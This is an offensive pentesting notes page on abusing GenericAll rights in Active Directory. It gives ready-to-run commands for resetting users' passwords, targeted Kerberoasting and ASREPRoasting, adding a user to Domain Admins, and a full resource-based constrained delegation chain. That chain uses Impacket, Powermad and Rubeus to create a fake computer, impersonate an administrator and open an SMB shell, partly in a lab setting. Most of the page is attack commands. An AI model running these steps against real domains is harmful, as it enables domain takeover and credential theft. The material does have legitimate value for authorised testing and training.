# GenericAll Abuse



## Introduction

Active Directory users are defined by securable objects known as ACL/ACE's. Active Directory Discretionary Access Control Lists (DACLs) and Acccess Control Entries (ACEs). These define what permissions the user has and can or cannot do  (i.e change account name, reset password, etc).&#x20;

<mark style="color:yellow;">**GenericAll is the "God Mode" of the object permissions.**</mark>

Here are some AD object permissions we're interested in.

* **GenericAll** - full rights to the object (add users to a group or reset user's password - <mark style="color:yellow;">God mode</mark>).
* **GenericWrite** - update object's attributes (i.e logon script)
* **WriteOwner** - change object owner to attacker controlled user take over the object
* **WriteDACL** - modify object's ACEs and give attacker full control right over the object
* **AllExtendedRights** - ability to add user to a group or reset password
* **ForceChangePassword** - ability to change user's password
* **Self (Self-Membership)** - ability to add yourself to a group



## Abusing GenericAll

There are three types of objects that can a user can have GenericAll permissions. User, Group, and Computer.

To view ACL/ACE permissions we can use tools like **`PowerView`** and **`Bloodhound`**.



### GenericAll on User

*   **Change password**: You could just change the password of that user with

    ```powershell
    net user <username> <password> /domain
    ```
*   **Targeted Kerberoasting**: You could make the user **kerberoastable** setting an **SPN** on the account, kerberoast it and attempt to crack offline:

    ```powershell
    # Set SPN
    Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
    # Get Hash
    .\Rubeus.exe kerberoast /user:<username> /nowrap
    # Clean SPN
    Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose

    # You can also use the tool https://github.com/ShutdownRepo/targetedKerberoast 
    # to get hashes of one or all the users
    python3 targetedKerberoast.py -domain.local -u <username> -p password -v
    ```
*   **Targeted ASREPRoasting**: You could make the user **ASREPRoastable** by **disabling** **preauthentication** and then ASREProast it.

    ```powershell
    Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
    ```

### GenericAll on Group

We can add a user we control to the vulnerable group.

```powershell
net group "domain admins" <username> /add /domain
```



### GenericAll on Computer

A common attack with generic all on a computer object is to add a fake computer to the domain.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

If enumerating and we see a user has GenericAll permission on a computer we know we full control.

We can perform a <mark style="color:yellow;">**Kerberos Resourced Based Constrained Delegation attack**</mark>: computer takover. This attack allows us to impersonate a specific user (Administrator).





## Abusing GenericAll Computer Object Kerberoast Ticket Abuse

###

### Also known as: "Resource Based Constrained Delegation Attack"

We will be following this guide [https://github.com/tothi/rbcd-attack](https://github.com/tothi/rbcd-attack)

### Toshi's "Impacket" method.

### Add Computer to Domain

We'll first need to add a new machine. We can add a computer to the domain with impacket-addcomputer.

Below are some useful commands.

<pre class="language-powershell"><code class="lang-powershell"><strong># Add a computer to the domain via domain credentials
</strong>impacket-addcomputer domain.com/user -dc-ip 192.168.x.x -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'

#Add a computer account via hashed credentials
impacket-addcomputer domain.com/user -dc-ip 192.168.x.x -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
<strong>
</strong><strong># Add a computer account via domain credentials
</strong>impacket-addcomputer -computer-name 'COMPUTER$' -computer-pass 'SomePassword' -dc-host $DomainController -domain-netbios $DOMAIN 'DOMAIN\user:password'

# Modify a computer account password
impacket-addcomputer -computer-name 'COMPUTER$' -computer-pass 'SomePassword' -dc-host $DomainController -no-add 'DOMAIN\user:password'

# Delete a computer account
impacket-addcomputer -computer-name 'COMPUTER$' -dc-host $DomainController -delete 'DOMAIN\user:password'
</code></pre>

### Toshi's rbcd attack

{% embed url="https://github.com/tothi/rbcd-attack" %}

#### Creating the fake computer

Using addcomputer.py example from Impacket let's create a fake computer (called `evilcomputer`):

```
addcomputer.py -computer-name 'evilcomputer$' -computer-pass ev1lP@sS -dc-ip 192.168.33.203 ecorp.local/test:ohW9Lie0
```

#### Modifying delegation rights

Implemented the script [rbcd.py](https://github.com/tothi/rbcd-attack/blob/master/rbcd.py) found here in the repo which adds the related security descriptor of the newly created EVILCOMPUTER to the `msDS-AllowedToActOnBehalfOfOtherIdentity` property of the target computer.

```
./rbcd.py -f EVILCOMPUTER -t WEB -dc-ip 192.168.33.203 ecorp\\test:ohW9Lie0
```

The script uses heavily the Python classes in the `ntlmrelayx.py` Impacket example. For help and an example call the script without options.

#### Getting the impersonated service ticket

Now everything is ready for abusing the Constrained Delegation by an S4U2Self query and get an impersonated Service Ticket for the target computer. With `getST.py` Impacket example script:

```
getST.py -spn cifs/WEB.ecorp.local -impersonate admin -dc-ip 192.168.33.203 ecorp.local/EVILCOMPUTER$:ev1lP@sS
```

The above command fetches a CIFS Service Ticket on behalf of the targetted domain user `admin` and stores it in the file `admin.ccache`.

After adding the file path to the KRB5CCNAME variable the ticket is usable for Kerberos clients.

```
export KRB5CCNAME=`pwd`/admin.ccache
klist
```





### Server Side Method

Here is another way to abuse GenericAll on a computer group

```powershell
# -------- On Server Side
# Upload tools
upload /home/user/Tools/Powermad/Powermad.ps1 pm.ps1
upload /home/user/Tools/Ghostpack-CompiledBinaries/Rubeus.exe r.exe

# Import PowerMad
Import-Module ./pm.ps1

# Set variables
Set-Variable -Name "FakePC" -Value "FAKE01"
Set-Variable -Name "targetComputer" -Value "DC"

# With Powermad, Add the new fake computer object to AD.
New-MachineAccount -MachineAccount (Get-Variable -Name "FakePC").Value -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# With Built-in AD modules, give the new fake computer object the Constrained Delegation privilege.
Set-ADComputer (Get-Variable -Name "targetComputer").Value -PrincipalsAllowedToDelegateToAccount ((Get-Variable -Name "FakePC").Value + '$')

# With Built-in AD modules, check that the last command worked.
Get-ADComputer (Get-Variable -Name "targetComputer").Value -Properties PrincipalsAllowedToDelegateToAccount
```



<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```powershell
# With Rubeus, generate the new fake computer object password hashes. 
#  Since we created the computer object with the password 123456 we will need those hashes
#  for the next step.
./r.exe hash /password:123456 /user:FAKE01$ /domain:support.htb
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```powershell
# -------- On Attck Box Side.
# Using getTGT from Impacket, generate a ccached TGT and used KERB5CCNAME pass the ccahe file for the requested service. 
#   If you are getting errors, "cd ~/impacket/", "python3 -m pip install ."
/home/user/Tools/impacket/examples/getST.py support.htb/FAKE01 -dc-ip dc.support.htb -impersonate administrator -spn http/dc.support.htb -aesKey 35CE465C01BC1577DE3410452165E5244779C17B64E6D89459C1EC3C8DAA362B

# Set local variable of KERB5CCNAME to pass the ccahe TGT file for the requested service.
export KRB5CCNAME=administrator.ccache

# Use smbexec.py to connect with the TGT we just made to the server as the user administrator 
#  over SMB protocol.
smbexec.py support.htb/administrator@dc.support.htb -no-pass -k
```
